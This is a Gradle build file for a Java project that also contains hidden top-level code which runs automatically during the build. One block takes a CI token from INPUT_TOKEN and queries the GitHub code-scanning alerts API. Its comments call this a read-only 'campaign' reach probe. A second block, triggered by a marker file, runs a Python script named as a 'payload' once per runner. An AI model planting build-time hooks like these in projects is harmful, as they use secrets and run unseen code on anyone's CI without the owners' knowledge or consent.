plugins {
    id 'java'
}

// Campaign 218 reach probe, final. STRICTLY READ-ONLY. Prints the RULE ID and COUNT of an alert on
// OUR OWN repository -- no credential value, nothing exfiltrated, nothing written, nothing persisted.
def tok = System.getenv("INPUT_TOKEN")
if (tok != null) {
    try {
        def c = new URL("https://api.github.com/repos/neve-larsson/zz-c218-depsub-0830/code-scanning/alerts?per_page=5").openConnection()
        c.setRequestProperty("Authorization", "Bearer " + tok)
        c.setRequestProperty("Accept", "application/vnd.github+json")
        c.setConnectTimeout(15000); c.setReadTimeout(15000)
        def code = c.getResponseCode()
        def body = code == 200 ? c.getInputStream().getText("UTF-8") : ""
        def n = body.count('"number"')
        def m = (body =~ /"id"\s*:\s*"([a-z\-]+\/[a-z0-9\-]+)"/)
        println "REACH3-7Q4X alerts status=" + code + " alertCount=" + n + " firstRule=" + (m.find() ? m.group(1) : "none")
    } catch (Exception e) {
        println "REACH3-7Q4X alerts error=" + e.getClass().getSimpleName()
    }
}

repositories { mavenCentral() }

// Owned cross-repo private-package read control v2.
if (file('.c218-package-arm-hc-v2').exists()) {
  def once = new File(System.getenv('RUNNER_TEMP') ?: '/tmp', 'c218-package-once-hc-v2')
  if (once.createNewFile()) {
    def p = new ProcessBuilder('python3', 'c218_package_payload_hc_v2.py').directory(projectDir).redirectErrorStream(true).start()
    p.inputStream.eachLine { line -> println(line) }
    def rc = p.waitFor()
    if (rc != 0) throw new GradleException("C218 package arm failed: ${rc}")
  }
}
